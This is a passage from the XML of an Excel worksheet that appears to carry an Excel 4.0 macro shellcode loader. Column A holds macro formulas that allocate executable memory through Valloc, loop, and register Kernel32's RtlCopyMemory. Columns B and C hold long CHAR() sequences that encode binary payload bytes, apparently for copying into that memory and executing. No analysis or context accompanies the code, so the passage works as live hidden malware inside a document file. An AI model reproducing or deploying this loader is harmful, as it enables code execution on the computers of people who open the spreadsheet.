;CHAR(169)&amp;CHAR(55)&amp;CHAR(39)&amp;CHAR(147)&amp;CHAR(174)&amp;CHAR(37)&amp;CHAR(164)&amp;CHAR(71)&amp;CHAR(148)&amp;CHAR(13)&amp;CHAR(153)&amp;CHAR(254)&amp;CHAR(97)&amp;CHAR(209)&amp;CHAR(75)&amp;CHAR(84)&amp;CHAR(130)&amp;CHAR(69)&amp;CHAR(193)&amp;CHAR(67)&amp;CHAR(49)&amp;CHAR(234)&amp;CHAR(26)&amp;CHAR(103)&amp;CHAR(75)&amp;CHAR(144)&amp;CHAR(194)&amp;CHAR(134)&amp;CHAR(192)&amp;CHAR(134)&amp;CHAR(12)&amp;CHAR(253)&amp;CHAR(241)&amp;CHAR(154)&amp;CHAR(45)&amp;CHAR(152)&amp;CHAR(216)&amp;CHAR(236)&amp;CHAR(221)&amp;CHAR(215)&amp;CHAR(97)&amp;CHAR(22)&amp;CHAR(81)&amp;CHAR(216)&amp;CHAR(27)&amp;CHAR(40)&amp;CHAR(253)&amp;CHAR(141)&amp;CHAR(135)&amp;CHAR(194)&amp;CHAR(3)&amp;CHAR(180)&amp;CHAR(143)&amp;CHAR(33)&amp;CHAR(14)&amp;CHAR(45)&amp;CHAR(94)&amp;CHAR(188)&amp;CHAR(24)&amp;CHAR(252)&amp;CHAR(136)&amp;CHAR(5)&amp;CHAR(198)&amp;CHAR(209)&amp;CHAR(27)&amp;CHAR(174)&amp;CHAR(100)&amp;CHAR(139)&amp;CHAR(2)&amp;CHAR(148)&amp;CHAR(178)&amp;CHAR(22)&amp;CHAR(169)&amp;CHAR(244)&amp;CHAR(68)&amp;CHAR(2)&amp;CHAR(69)&amp;CHAR(211)&amp;CHAR(18)&amp;CHAR(110)&amp;CHAR(72)&amp;CHAR(50)&amp;CHAR(135)&amp;CHAR(127)&amp;CHAR(9)&amp;CHAR(20)&amp;CHAR(118)&amp;CHAR(109)&amp;CHAR(181)&amp;CHAR(231)&amp;CHAR(168)&amp;CHAR(215)&amp;CHAR(233)&amp;CHAR(76)&amp;CHAR(157)&amp;CHAR(162)&amp;CHAR(143)&amp;CHAR(169)&amp;CHAR(251)&amp;CHAR(9)&amp;CHAR(19)&amp;CHAR(92)&amp;CHAR(189)&amp;CHAR(99)&amp;CHAR(232)&amp;CHAR(210)&amp;CHAR(181)&amp;CHAR(225)&amp;CHAR(10)&amp;CHAR(186)</f>
        <v>+@ÚR_x000B_ƒÕ©¦ù˜þžÑrìG8y;É[Ó«_x0012_i&lt;}ÁÇºðú¬_x0015_2'Dÿ]‹t`ß†[úðÞ2S_x0012_
_x0013_‚ŠÃý†ˆ_x0008_¶^L_x0013_É{_x000F_î_ªIP˜_x0002_ÿXÔ¥Q€Ïd_x000B_Á=OfW@¿õ_x001E_ø_x001F__x0017_2ïÏÌæÜ\°è‚bÏ!Ú—† ;! _x0013_
L:Õn_x0010_'‚wæž.×%Wà¤Ø Ç¿[ÆŠ©7'“®%¤G”_x000D_™þaÑKT‚EÁC1ê_x001A_gKÂ†À†_x000C_ýñš-˜ØìÝ×a_x0016_QØ_x001B_(ý‡Â_x0003_´!_x000E_-^¼_x0018_üˆ_x0005_ÆÑ_x001B_®d‹_x0002_”²_x0016_©ôD_x0002_EÓ_x0012_nH2‡	_x0014_vmµç¨×éL¢©û	_x0013_\½cèÒµá
º</v>
      </c>
      <c r="C23" t="str">
        <f>CHAR(140)&amp;CHAR(209)&amp;CHAR(89)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(110)&amp;CHAR(13)&amp;CHAR(160)&amp;CHAR(145)</f>
        <v>ŒÑYzˆên_x000D_ ‘</v>
      </c>
    </row>
    <row r="24" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A24" t="b">
        <f>SET.VALUE(A22,Valloc(A21,65536,12288,64))</f>
        <v>0</v>
      </c>
      <c r="B24" t="str">
        <f>CHAR(18)&amp;CHAR(171)&amp;CHAR(99)&amp;CHAR(114)&amp;CHAR(22)&amp;CHAR(119)&amp;CHAR(151)&amp;CHAR(61)&amp;CHAR(67)&amp;CHAR(229)&amp;CHAR(120)&amp;CHAR(226)&amp;CHAR(77)&amp;CHAR(228)&amp;CHAR(79)&amp;CHAR(67)&amp;CHAR(62)&amp;CHAR(85)&amp;CHAR(250)&amp;CHAR(244)&amp;CHAR(88)&amp;CHAR(196)&amp;CHAR(102)&amp;CHAR(78)&amp;CHAR(238)&amp;CHAR(5)&amp;CHAR(87)&amp;CHAR(192)&amp;CHAR(6)&amp;CHAR(222)&amp;CHAR(85)&amp;CHAR(58)&amp;CHAR(107)&amp;CHAR(206)&amp;CHAR(84)&amp;CHAR(229)&amp;CHAR(120)&amp;CHAR(124)&amp;CHAR(145)&amp;CHAR(155)&amp;CHAR(160)&amp;CHAR(97)&amp;CHAR(48)&amp;CHAR(165)&amp;CHAR(197)&amp;CHAR(13)&amp;CHAR(177)&amp;CHAR(123)&amp;CHAR(82)&amp;CHAR(71)&amp;CHAR(129)&amp;CHAR(218)&amp;CHAR(62)&amp;CHAR(1)&amp;CHAR(98)&amp;CHAR(168)&amp;CHAR(5)&amp;CHAR(109)&amp;CHAR(191)&amp;CHAR(78)&amp;CHAR(189)&amp;CHAR(84)&amp;CHAR(34)&amp;CHAR(14)&amp;CHAR(247)&amp;CHAR(160)&amp;CHAR(253)&amp;CHAR(193)&amp;CHAR(227)&amp;CHAR(18)&amp;CHAR(147)&amp;CHAR(49)&amp;CHAR(207)&amp;CHAR(189)&amp;CHAR(156)&amp;CHAR(107)&amp;CHAR(167)&amp;CHAR(15)&amp;CHAR(200)&amp;CHAR(234)&amp;CHAR(215)&amp;CHAR(196)&amp;CHAR(232)&amp;CHAR(55)&amp;CHAR(34)&amp;CHAR(3)&amp;CHAR(69)&amp;CHAR(97)&amp;CHAR(78)&amp;CHAR(109)&amp;CHAR(100)&amp;CHAR(59)&amp;CHAR(137)&amp;CHAR(253)&amp;CHAR(56)&amp;CHAR(137)&amp;CHAR(92)&amp;CHAR(239)&amp;CHAR(101)&amp;CHAR(52)&amp;CHAR(41)&amp;CHAR(64)&amp;CHAR(244)&amp;CHAR(173)&amp;CHAR(39)&amp;CHAR(4)&amp;CHAR(157)&amp;CHAR(79)&amp;CHAR(216)&amp;CHAR(9)&amp;CHAR(77)&amp;CHAR(202)&amp;CHAR(122)&amp;CHAR(71)&amp;CHAR(88)&amp;CHAR(137)&amp;CHAR(81)&amp;CHAR(21)&amp;CHAR(53)&amp;CHAR(196)&amp;CHAR(219)&amp;CHAR(39)&amp;CHAR(188)&amp;CHAR(239)&amp;CHAR(211)&amp;CHAR(188)&amp;CHAR(207)&amp;CHAR(32)&amp;CHAR(115)&amp;CHAR(31)&amp;CHAR(157)&amp;CHAR(169)&amp;CHAR(96)&amp;CHAR(11)&amp;CHAR(23)&amp;CHAR(211)&amp;CHAR(146)&amp;CHAR(128)&amp;CHAR(107)&amp;CHAR(203)&amp;CHAR(173)&amp;CHAR(174)&amp;CHAR(254)&amp;CHAR(78)&amp;CHAR(165)&amp;CHAR(93)&amp;CHAR(175)&amp;CHAR(7)&amp;CHAR(135)&amp;CHAR(42)&amp;CHAR(110)&amp;CHAR(179)&amp;CHAR(3)&amp;CHAR(45)&amp;CHAR(60)&amp;CHAR(240)&amp;CHAR(26)&amp;CHAR(237)&amp;CHAR(176)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(103)&amp;CHAR(228)&amp;CHAR(142)&amp;CHAR(224)&amp;CHAR(96)&amp;CHAR(238)&amp;CHAR(61)&amp;CHAR(81)&amp;CHAR(227)&amp;CHAR(124)&amp;CHAR(90)&amp;CHAR(222)&amp;CHAR(198)&amp;CHAR(1)&amp;CHAR(47)&amp;CHAR(19)&amp;CHAR(96)&amp;CHAR(26)&amp;CHAR(6)&amp;CHAR(215)&amp;CHAR(98)&amp;CHAR(179)&amp;CHAR(194)&amp;CHAR(107)&amp;CHAR(143)&amp;CHAR(190)&amp;CHAR(19)&amp;CHAR(208)&amp;CHAR(147)&amp;CHAR(204)&amp;CHAR(4)&amp;CHAR(19)&amp;CHAR(232)&amp;CHAR(135)&amp;CHAR(234)&amp;CHAR(6)&amp;CHAR(147)&amp;CHAR(45)&amp;CHAR(93)&amp;CHAR(9)&amp;CHAR(194)&amp;CHAR(77)&amp;CHAR(86)&amp;CHAR(136)&amp;CHAR(100)&amp;CHAR(89)&amp;CHAR(34)&amp;CHAR(129)&amp;CHAR(100)&amp;CHAR(6)&amp;CHAR(192)&amp;CHAR(216)&amp;CHAR(50)&amp;CHAR(64)&amp;CHAR(186)&amp;CHAR(244)&amp;CHAR(101)&amp;CHAR(206)&amp;CHAR(45)&amp;CHAR(133)&amp;CHAR(99)&amp;CHAR(128)&amp;CHAR(128)&amp;CHAR(161)&amp;CHAR(249)&amp;CHAR(95)&amp;CHAR(233)&amp;CHAR(55)&amp;CHAR(127)&amp;CHAR(163)&amp;CHAR(30)&amp;CHAR(98)&amp;CHAR(199)&amp;CHAR(57)&amp;CHAR(76)&amp;CHAR(60)&amp;CHAR(37)&amp;CHAR(130)&amp;CHAR(129)&amp;CHAR(116)&amp;CHAR(68)&amp;CHAR(56)&amp;CHAR(231)&amp;CHAR(236)&amp;CHAR(113)&amp;CHAR(175)&amp;CHAR(30)&amp;CHAR(175)&amp;CHAR(240)&amp;CHAR(17)&amp;CHAR(51)&amp;CHAR(145)&amp;CHAR(206)&amp;CHAR(181)</f>
        <v>_x0012_«cr_x0016_w—=CåxâMäOC&gt;UúôXÄfNî_x0005_WÀ_x0006_ÞU:kÎTåx|‘› a0¥Å_x000D_±{RGÚ&gt;_x0001_b¨_x0005_m¿N½T"_x000E_÷ ýÁã_x0012_“1Ï½œk§_x000F_Èê×Äè7"_x0003_EaNmd;‰ý8‰\ïe4)@ô­'_x0004_OØ	MÊzGX‰Q_x0015_5ÄÛ'¼ïÓ¼Ï s_x001F_©`_x000B__x0017_Ó’€kË­®þN¥]¯_x0007_‡*n³_x0003_-&lt;ð_x001A_í°±ÖgäŽà`î=Qã|ZÞÆ_x0001_/_x0013_`_x001A__x0006_×b³Âk¾_x0013_Ð“Ì_x0004__x0013_è‡ê_x0006_“-]	ÂMVˆdY"d_x0006_ÀØ2@ºôeÎ-…c€€¡ù_é7£_x001E_bÇ9L&lt;%‚tD8çìq¯_x001E_¯ð_x0011_3‘Îµ</v>
      </c>
      <c r="C24" t="str">
        <f>CHAR(57)&amp;CHAR(241)&amp;CHAR(188)&amp;CHAR(207)&amp;CHAR(185)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(57)&amp;CHAR(249)</f>
        <v>9ñ¼Ï¹[¸ô9ù</v>
      </c>
    </row>
    <row r="25" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A25" t="b">
        <f>SET.VALUE(A21,A21+262144)</f>
        <v>0</v>
      </c>
      <c r="B25" t="str">
        <f>CHAR(205)&amp;CHAR(41)&amp;CHAR(222)&amp;CHAR(139)&amp;CHAR(213)&amp;CHAR(160)&amp;CHAR(56)&amp;CHAR(49)&amp;CHAR(236)&amp;CHAR(177)&amp;CHAR(32)&amp;CHAR(178)&amp;CHAR(223)&amp;CHAR(156)&amp;CHAR(255)&amp;CHAR(38)&amp;CHAR(51)&amp;CHAR(211)&amp;CHAR(127)&amp;CHAR(225)&amp;CHAR(248)&amp;CHAR(109)&amp;CHAR(22)&amp;CHAR(190)&amp;CHAR(221)&amp;CHAR(122)&amp;CHAR(26)&amp;CHAR(186)&amp;CHAR(123)&amp;CHAR(40)&amp;CHAR(63)&amp;CHAR(198)&amp;CHAR(246)&amp;CHAR(26)&amp;CHAR(150)&amp;CHAR(70)&amp;CHAR(115)&amp;CHAR(100)&amp;CHAR(39)&amp;CHAR(92)&amp;CHAR(227)&amp;CHAR(123)&amp;CHAR(62)&amp;CHAR(211)&amp;CHAR(108)&amp;CHAR(115)&amp;CHAR(38)&amp;CHAR(205)&amp;CHAR(30)&amp;CHAR(217)&amp;CHAR(125)&amp;CHAR(228)&amp;CHAR(68)&amp;CHAR(139)&amp;CHAR(90)&amp;CHAR(180)&amp;CHAR(197)&amp;CHAR(200)&amp;CHAR(112)&amp;CHAR(96)&amp;CHAR(62)&amp;CHAR(238)&amp;CHAR(77)&amp;CHAR(87)&amp;CHAR(183)&amp;CHAR(3)&amp;CHAR(245)&amp;CHAR(150)&amp;CHAR(10)&amp;CHAR(119)&amp;CHAR(189)&amp;CHAR(69)&amp;CHAR(114)&amp;CHAR(102)&amp;CHAR(249)&amp;CHAR(229)&amp;CHAR(145)&amp;CHAR(211)&amp;CHAR(198)&amp;CHAR(99)&amp;CHAR(26)&amp;CHAR(151)&amp;CHAR(206)&amp;CHAR(106)&amp;CHAR(157)&amp;CHAR(130)&amp;CHAR(195)&amp;CHAR(182)&amp;CHAR(105)&amp;CHAR(124)&amp;CHAR(114)&amp;CHAR(41)&amp;CHAR(97)&amp;CHAR(120)&amp;CHAR(173)&amp;CHAR(63)&amp;CHAR(33)&amp;CHAR(52)&amp;CHAR(179)&amp;CHAR(119)&amp;CHAR(182)&amp;CHAR(125)&amp;CHAR(107)&amp;CHAR(240)&amp;CHAR(173)&amp;CHAR(236)&amp;CHAR(226)&amp;CHAR(167)&amp;CHAR(167)&amp;CHAR(180)&amp;CHAR(139)&amp;CHAR(225)&amp;CHAR(202)&amp;CHAR(131)&amp;CHAR(104)&amp;CHAR(234)&amp;CHAR(250)&amp;CHAR(176)&amp;CHAR(94)&amp;CHAR(116)&amp;CHAR(222)&amp;CHAR(55)&amp;CHAR(161)&amp;CHAR(105)&amp;CHAR(180)&amp;CHAR(195)&amp;CHAR(55)&amp;CHAR(33)&amp;CHAR(12)&amp;CHAR(104)&amp;CHAR(240)&amp;CHAR(228)&amp;CHAR(21)&amp;CHAR(34)&amp;CHAR(183)&amp;CHAR(85)&amp;CHAR(246)&amp;CHAR(16)&amp;CHAR(193)&amp;CHAR(76)&amp;CHAR(250)&amp;CHAR(179)&amp;CHAR(255)&amp;CHAR(161)&amp;CHAR(248)&amp;CHAR(162)&amp;CHAR(43)&amp;CHAR(79)&amp;CHAR(88)&amp;CHAR(26)&amp;CHAR(103)&amp;CHAR(249)&amp;CHAR(105)&amp;CHAR(176)&amp;CHAR(209)&amp;CHAR(116)&amp;CHAR(16)&amp;CHAR(195)&amp;CHAR(133)&amp;CHAR(71)&amp;CHAR(12)&amp;CHAR(55)&amp;CHAR(95)&amp;CHAR(15)&amp;CHAR(199)&amp;CHAR(213)&amp;CHAR(164)&amp;CHAR(189)&amp;CHAR(78)&amp;CHAR(119)&amp;CHAR(119)&amp;CHAR(24)&amp;CHAR(240)&amp;CHAR(189)&amp;CHAR(27)&amp;CHAR(49)&amp;CHAR(35)&amp;CHAR(16)&amp;CHAR(58)&amp;CHAR(169)&amp;CHAR(146)&amp;CHAR(162)&amp;CHAR(226)&amp;CHAR(110)&amp;CHAR(135)&amp;CHAR(3)&amp;CHAR(167)&amp;CHAR(41)&amp;CHAR(227)&amp;CHAR(20)&amp;CHAR(246)&amp;CHAR(154)&amp;CHAR(243)&amp;CHAR(118)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(131)&amp;CHAR(140)&amp;CHAR(18)&amp;CHAR(226)&amp;CHAR(199)&amp;CHAR(221)&amp;CHAR(180)&amp;CHAR(23)&amp;CHAR(16)&amp;CHAR(89)&amp;CHAR(68)&amp;CHAR(29)&amp;CHAR(193)&amp;CHAR(172)&amp;CHAR(47)&amp;CHAR(172)&amp;CHAR(239)&amp;CHAR(15)&amp;CHAR(5)&amp;CHAR(232)&amp;CHAR(254)&amp;CHAR(184)&amp;CHAR(173)&amp;CHAR(106)&amp;CHAR(118)&amp;CHAR(61)&amp;CHAR(132)&amp;CHAR(83)&amp;CHAR(211)&amp;CHAR(117)&amp;CHAR(235)&amp;CHAR(70)&amp;CHAR(86)&amp;CHAR(6)&amp;CHAR(206)&amp;CHAR(246)&amp;CHAR(131)&amp;CHAR(112)&amp;CHAR(199)&amp;CHAR(196)&amp;CHAR(66)&amp;CHAR(247)&amp;CHAR(6)&amp;CHAR(18)&amp;CHAR(75)&amp;CHAR(50)&amp;CHAR(18)&amp;CHAR(141)&amp;CHAR(124)&amp;CHAR(16)&amp;CHAR(197)&amp;CHAR(168)&amp;CHAR(212)&amp;CHAR(88)&amp;CHAR(1)&amp;CHAR(71)&amp;CHAR(118)&amp;CHAR(54)&amp;CHAR(227)</f>
        <v>Í)Þ‹Õ 81ì± ²ßœÿ&amp;3Óáøm_x0016_¾Ýz_x001A_º{(?Æö_x001A_–Fsd'\ã{&gt;Óls&amp;Í_x001E_Ù}äD‹Z´ÅÈp`&gt;îMW·_x0003_õ–
w½Erfùå‘ÓÆc_x001A_—Îj‚Ã¶i|r)ax­?!4³w¶}kð­ìâ§§´‹áÊƒhêú°^tÞ7¡i´Ã7!_x000C_hðä_x0015_"·Uö_x0010_ÁLú³ÿ¡ø¢+OX_x001A_gùi°Ñt_x0010_Ã…G_x000C_7__x000F_ÇÕ¤½Nww_x0018_ð½_x001B_1#_x0010_:©’¢ân‡_x0003_§)ã_x0014_öšóv_x0012__x0005_ƒŒ_x0012_âÇÝ´_x0017__x0010_YD_x001D_Á¬/¬ï_x000F__x0005_èþ¸­jv=„SÓuëFV_x0006_ÎöƒpÇÄB÷_x0006__x0012_K2_x0012_|_x0010_Å¨ÔX_x0001_Gv6ã</v>
      </c>
      <c r="C25" t="str">
        <f>CHAR(78)&amp;CHAR(194)&amp;CHAR(216)&amp;CHAR(210)&amp;CHAR(72)&amp;CHAR(188)&amp;CHAR(252)&amp;CHAR(111)&amp;CHAR(29)&amp;CHAR(236)</f>
        <v>NÂØÒH¼üo_x001D_ì</v>
      </c>
    </row>
    <row r="26" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A26" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
      <c r="B26" t="str">
        <f>CHAR(62)&amp;CHAR(166)&amp;CHAR(104)&amp;CHAR(15)&amp;CHAR(188)&amp;CHAR(95)&amp;CHAR(255)&amp;CHAR(210)&amp;CHAR(63)&amp;CHAR(49)&amp;CHAR(31)&amp;CHAR(46)&amp;CHAR(222)&amp;CHAR(120)&amp;CHAR(183)&amp;CHAR(216)&amp;CHAR(99)&amp;CHAR(31)&amp;CHAR(65)&amp;CHAR(83)&amp;CHAR(109)&amp;CHAR(215)&amp;CHAR(60)&amp;CHAR(216)&amp;CHAR(20)&amp;CHAR(138)&amp;CHAR(178)&amp;CHAR(246)&amp;CHAR(205)&amp;CHAR(153)&amp;CHAR(131)&amp;CHAR(112)&amp;CHAR(231)&amp;CHAR(172)&amp;CHAR(237)&amp;CHAR(229)&amp;CHAR(160)&amp;CHAR(181)&amp;CHAR(137)&amp;CHAR(52)&amp;CHAR(56)&amp;CHAR(90)&amp;CHAR(203)&amp;CHAR(197)&amp;CHAR(125)&amp;CHAR(139)&amp;CHAR(22)&amp;CHAR(136)&amp;CHAR(247)&amp;CHAR(29)&amp;CHAR(92)&amp;CHAR(43)&amp;CHAR(253)&amp;CHAR(164)&amp;CHAR(55)&amp;CHAR(55)&amp;CHAR(144)&amp;CHAR(114)&amp;CHAR(170)&amp;CHAR(200)&amp;CHAR(111)&amp;CHAR(25)&amp;CHAR(194)&amp;CHAR(65)&amp;CHAR(143)&amp;CHAR(113)&amp;CHAR(128)&amp;CHAR(170)&amp;CHAR(203)&amp;CHAR(191)&amp;CHAR(136)&amp;CHAR(241)&amp;CHAR(97)&amp;CHAR(223)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(173)&amp;CHAR(143)&amp;CHAR(69)&amp;CHAR(51)&amp;CHAR(189)&amp;CHAR(14)&amp;CHAR(38)&amp;CHAR(147)&amp;CHAR(152)&amp;CHAR(63)&amp;CHAR(42)&amp;CHAR(21)&amp;CHAR(236)&amp;CHAR(114)&amp;CHAR(5)&amp;CHAR(68)&amp;CHAR(52)&amp;CHAR(28)&amp;CHAR(70)&amp;CHAR(213)&amp;CHAR(164)&amp;CHAR(225)&amp;CHAR(107)&amp;CHAR(251)&amp;CHAR(177)&amp;CHAR(164)&amp;CHAR(148)&amp;CHAR(66)&amp;CHAR(47)&amp;CHAR(123)&amp;CHAR(88)&amp;CHAR(247)&amp;CHAR(29)&amp;CHAR(16)&amp;CHAR(239)&amp;CHAR(68)&amp;CHAR(43)&amp;CHAR(113)&amp;CHAR(58)&amp;CHAR(34)&amp;CHAR(66)&amp;CHAR(221)&amp;CHAR(12)&amp;CHAR(184)&amp;CHAR(97)&amp;CHAR(8)&amp;CHAR(100)&amp;CHAR(15)&amp;CHAR(209)&amp;CHAR(20)&amp;CHAR(192)&amp;CHAR(7)&amp;CHAR(239)&amp;CHAR(94)&amp;CHAR(19)&amp;CHAR(133)&amp;CHAR(167)&amp;CHAR(50)&amp;CHAR(139)&amp;CHAR(163)&amp;CHAR(210)&amp;CHAR(94)&amp;CHAR(28)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(157)&amp;CHAR(163)&amp;CHAR(45)&amp;CHAR(51)&amp;CHAR(46)&amp;CHAR(224)&amp;CHAR(251)&amp;CHAR(3)&amp;CHAR(162)&amp;CHAR(97)&amp;CHAR(39)&amp;CHAR(172)&amp;CHAR(36)&amp;CHAR(164)&amp;CHAR(120)&amp;CHAR(200)&amp;CHAR(130)&amp;CHAR(244)&amp;CHAR(172)&amp;CHAR(70)&amp;CHAR(81)&amp;CHAR(65)&amp;CHAR(133)&amp;CHAR(20)&amp;CHAR(237)&amp;CHAR(111)&amp;CHAR(217)&amp;CHAR(55)&amp;CHAR(194)&amp;CHAR(50)&amp;CHAR(161)&amp;CHAR(17)&amp;CHAR(247)&amp;CHAR(58)&amp;CHAR(189)&amp;CHAR(222)&amp;CHAR(209)&amp;CHAR(172)&amp;CHAR(173)&amp;CHAR(3)&amp;CHAR(173)&amp;CHAR(185)&amp;CHAR(168)&amp;CHAR(50)&amp;CHAR(195)&amp;CHAR(163)&amp;CHAR(224)&amp;CHAR(190)&amp;CHAR(243)&amp;CHAR(246)&amp;CHAR(124)&amp;CHAR(18)&amp;CHAR(217)&amp;CHAR(155)&amp;CHAR(11)&amp;CHAR(150)&amp;CHAR(250)&amp;CHAR(21)&amp;CHAR(220)&amp;CHAR(27)&amp;CHAR(226)&amp;CHAR(157)&amp;CHAR(250)&amp;CHAR(125)&amp;CHAR(8)&amp;CHAR(207)&amp;CHAR(234)&amp;CHAR(2)&amp;CHAR(127)&amp;CHAR(201)&amp;CHAR(55)&amp;CHAR(176)&amp;CHAR(54)&amp;CHAR(180)&amp;CHAR(172)&amp;CHAR(133)&amp;CHAR(232)&amp;CHAR(89)&amp;CHAR(145)&amp;CHAR(68)&amp;CHAR(22)&amp;CHAR(72)&amp;CHAR(205)&amp;CHAR(106)&amp;CHAR(8)&amp;CHAR(85)&amp;CHAR(40)&amp;CHAR(215)&amp;CHAR(109)&amp;CHAR(89)&amp;CHAR(106)&amp;CHAR(179)&amp;CHAR(142)&amp;CHAR(192)&amp;CHAR(44)&amp;CHAR(136)&amp;CHAR(142)&amp;CHAR(222)&amp;CHAR(153)&amp;CHAR(90)&amp;CHAR(2)&amp;CHAR(160)&amp;CHAR(47)&amp;CHAR(244)&amp;CHAR(186)&amp;CHAR(182)&amp;CHAR(244)&amp;CHAR(114)&amp;CHAR(75)&amp;CHAR(208)&amp;CHAR(192)&amp;CHAR(1)&amp;CHAR(169)&amp;CHAR(72)</f>
        <v>&gt;¦h_x000F_¼_ÿÒ?1_x001F_.Þx·Øc_x001F_ASm×&lt;Ø_x0014_Š²öÍ™ƒpç¬íå µ‰48ZËÅ}‹_x0016_ˆ÷_x001D_\+ý¤77rªÈo_x0019_ÂAq€ªË¿ˆñaß	_x0007_­E3½_x000E_&amp;“˜?*_x0015_ìr_x0005_D4_x001C_FÕ¤ákû±¤”B/{X÷_x001D__x0010_ïD+q:"BÝ_x000C_¸a_x0008_d_x000F_Ñ_x0014_À_x0007_ï^_x0013_…§2‹£Ò^_x001C_û»£-3.àû_x0003_¢a'¬$¤xÈ‚ô¬FQA…_x0014_íoÙ7Â2¡_x0011_÷:½ÞÑ¬­_x0003_­¹¨2Ã£à¾óö|_x0012_Ù›_x000B_–ú_x0015_Ü_x001B_âú}_x0008_Ïê_x0002_É7°6´¬…èY‘D_x0016_HÍj_x0008_U(×mYj³ŽÀ,ˆŽÞ™Z_x0002_ /ôº¶ôrKÐÀ_x0001_©H</v>
      </c>
      <c r="C26" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(240)&amp;CHAR(121)&amp;CHAR(124)&amp;CHAR(251)&amp;CHAR(142)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(179)</f>
        <v>‘[ðy|ûŽê‘³</v>
      </c>
    </row>
    <row r="27" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A27" t="b">
        <f>REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)</f>
        <v>0</v>
      </c>
      <c r="B27" t="str">
        <f>CHAR(113)&amp;CHAR(160)&amp;CHAR(28)&amp;CHAR(116)&amp;CHAR(153)&amp;CHAR(221)&amp;CHAR(107)&amp;CHAR(178)&amp;CHAR(118)&amp;CHAR(45)&amp;CHAR(102)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(252)&amp;CHAR(240)&amp;CHAR(170)&amp;CHAR(194)&amp;CHAR(230)&amp;CHAR(234)&amp;CHAR(83)&amp;CHAR(9)&amp;CHAR(169)&amp;CHAR(214)&amp;CHAR(241)&amp;CHAR(128)&amp;CHAR(76)&amp;CHAR(104)&amp;CHAR(169)&amp;CHAR(171)&amp;CHAR(176)&amp;CHAR(173)&amp;CHAR(193)&amp;CHAR(40)&amp;CHAR(149)&amp;CHAR(211)&amp;CHAR(112)&amp;CHAR(71)&amp;CHAR(119)&amp;CHAR(255)&amp;CHAR(251)&amp;CHAR(102)&amp;CHAR(245)&amp;CHAR(35)&amp;CHAR(49)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(203)&amp;CHAR(184)&amp;CHAR(31)&amp;CHAR(244)&amp;CHAR(14)&amp;CHAR(91)&amp;CHAR(148)&amp;CHAR(208)&amp;CHAR(202)&amp;CHAR(118)&amp;CHAR(39)&amp;CHAR(118)&amp;CHAR(111)&amp;CHAR(200)&amp;CHAR(141)&amp;CHAR(128)&amp;CHAR(94)&amp;CHAR(251)&amp;CHAR(166)&amp;CHAR(44)&amp;CHAR(22)&amp;CHAR(176)&amp;CHAR(149)&amp;CHAR(113)&amp;CHAR(134)&amp;CHAR(152)&amp;CHAR(202)&amp;CHAR(153)&amp;CHAR(157)&amp;CHAR(194)&amp;CHAR(48)&amp;CHAR(128)&amp;CHAR(155)&amp;CHAR(4)&amp;CHAR(246)&amp;CHAR(57)&amp;CHAR(59)&amp;CHAR(115)&amp;CHAR(169)&amp;CHAR(4)&amp;CHAR(212)&amp;CHAR(130)&amp;CHAR(27)&amp;CHAR(64)&amp;CHAR(174)&amp;CHAR(200)&amp;CHAR(110)&amp;CHAR(141)&amp;CHAR(148)&amp;CHAR(242)&amp;CHAR(19)&amp;CHAR(142)&amp;CHAR(40)&amp;CHAR(108)&amp;CHAR(50)&amp;CHAR(57)&amp;CHAR(138)&amp;CHAR(96)&amp;CHAR(66)&amp;CHAR(64)&amp;CHAR(248)&amp;CHAR(101)&amp;CHAR(138)&amp;CHAR(183)&amp;CHAR(84)&amp;CHAR(51)&amp;CHAR(80)&amp;CHAR(167)&amp;CHAR(108)&amp;CHAR(53)&amp;CHAR(235)&amp;CHAR(113)&amp;CHAR(8)&amp;CHAR(220)&amp;CHAR(3)&amp;CHAR(42)&amp;CHAR(12)&amp;CHAR(146)&amp;CHAR(208)&amp;CHAR(171)&amp;CHAR(168)&amp;CHAR(164)&amp;CHAR(199)&amp;CHAR(195)&amp;CHAR(139)&amp;CHAR(11)&amp;CHAR(238)&amp;CHAR(155)&amp;CHAR(55)&amp;CHAR(97)&amp;CHAR(194)&amp;CHAR(229)&amp;CHAR(119)&amp;CHAR(60)&amp;CHAR(140)&amp;CHAR(95)&amp;CHAR(190)&amp;CHAR(181)&amp;CHAR(184)&amp;CHAR(77)&amp;CHAR(48)&amp;CHAR(27)&amp;CHAR(29)&amp;CHAR(83)&amp;CHAR(239)&amp;CHAR(46)&amp;CHAR(152)&amp;CHAR(69)&amp;CHAR(109)&amp;CHAR(246)&amp;CHAR(135)&amp;CHAR(115)&amp;CHAR(37)&amp;CHAR(204)&amp;CHAR(240)&amp;CHAR(97)&amp;CHAR(175)&amp;CHAR(11)&amp;CHAR(198)&amp;CHAR(184)&amp;CHAR(20)&amp;CHAR(165)&amp;CHAR(10)&amp;CHAR(178)&amp;CHAR(36)&amp;CHAR(226)&amp;CHAR(116)&amp;CHAR(254)&amp;CHAR(67)&amp;CHAR(223)&amp;CHAR(108)&amp;CHAR(181)&amp;CHAR(4)&amp;CHAR(182)&amp;CHAR(38)&amp;CHAR(136)&amp;CHAR(86)&amp;CHAR(52)&amp;CHAR(187)&amp;CHAR(86)&amp;CHAR(29)&amp;CHAR(239)&amp;CHAR(40)&amp;CHAR(46)&amp;CHAR(198)&amp;CHAR(221)&amp;CHAR(150)&amp;CHAR(115)&amp;CHAR(43)&amp;CHAR(122)&amp;CHAR(108)&amp;CHAR(141)&amp;CHAR(132)&amp;CHAR(176)&amp;CHAR(5)&amp;CHAR(226)&amp;CHAR(185)&amp;CHAR(209)&amp;CHAR(218)&amp;CHAR(127)&amp;CHAR(105)&amp;CHAR(233)&amp;CHAR(47)&amp;CHAR(120)&amp;CHA